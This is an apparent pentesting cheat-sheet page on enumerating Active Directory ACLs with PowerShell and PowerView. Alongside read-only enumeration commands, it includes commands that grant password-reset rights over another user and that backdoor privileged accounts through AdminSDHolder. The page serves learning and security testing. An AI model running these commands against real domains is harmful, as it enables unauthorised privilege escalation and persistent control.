---
title: "Domain ACLs"
description: "Enumerating domain ACLs."
lead: "Enumerating information about domain ACLs using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:09:32+01:00
lastmod: 2021-11-07T18:09:32+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 60
toc: true
---

## General

- Access Control Entries (ACE) correspond to individual permission or audits access
- Who has permission and what can be done on an object?
- Two types:
  - DACL -> Defines the permissions trustees (a user or group) have on an object
  - SACL - Logs success and failure audit messages when an object is accessed

## Enumerate ACLs without resolving GUIDs

```powershell
# AD Module
(Get-ACL 'CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local').Access
```

## Get the ACLs associated with the specified Object

```powershell
# PowerView
Get-ObjectACL -SamAccountName "Users" -ResolveGUIDs
```

## Get the ACLs associated with the specified Prefix to be used for Search

```powershell
# PowerView
Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose
```

## Get the ACLs associated with the specified LDAP Path to be used for Search

```powershell
# PowerView
Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose
```

## Search for interesting ACEs

```powershell
# PowerView
Invoke-ACLScanner -ResolveGUIDs
```

## Get the ACLs associated with the specified Path

```powershell
# PowerView
Get-PathACL -Path "\\dc01.lab.local\sysvol"
```

## Enumerate who has Rights to the 'matt' User in 'testlab.local', resolving Rights GUIDs to Names

```powershell
# PowerView
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```

## Grant User 'will' the Rights to change 'matt's Password

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

## Audit the Permissions of AdminSDHolder, resolving GUIDs

```powershell
# PowerView
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
```

## Backdoor the ACLs of all privileged Accounts with the 'matt' Account through AdminSDHolder Abuse

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```

## Retrieve *most* Users who can perform DC Replication for dev.testlab.local (i.e. DCsync)

```powershell
# PowerView
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
```

## Enumerate Permissions for GPOs where Users with RIDs of > -1000 have some kind of Modification/Control Rights

```powershell
# PowerView
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```
